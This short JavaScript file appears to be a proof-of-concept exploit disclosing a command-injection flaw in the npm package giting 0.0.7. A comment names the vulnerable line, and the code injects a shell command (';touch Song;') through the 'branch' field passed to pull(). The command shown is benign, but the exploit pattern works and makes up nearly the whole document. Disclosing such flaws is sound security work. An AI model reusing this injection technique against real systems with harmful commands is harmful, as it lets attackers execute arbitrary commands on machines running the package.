/**
 * giting@0.0.7 is vulnerable to command injection.
 * 
 * The injection point is located in line 223 of file "lib/helpers/run-git-command.js" 
 * The first arguments "repo" of function pull() can be controlled by users without any sanitization.
 */

var Test = require("giting");
var injection_command = ";touch Song;";
test = new Test({"workDir": "./"});
repo = {"organization": "./", "name": "./", "branch": injection_command}
test.pull(repo, function(){});
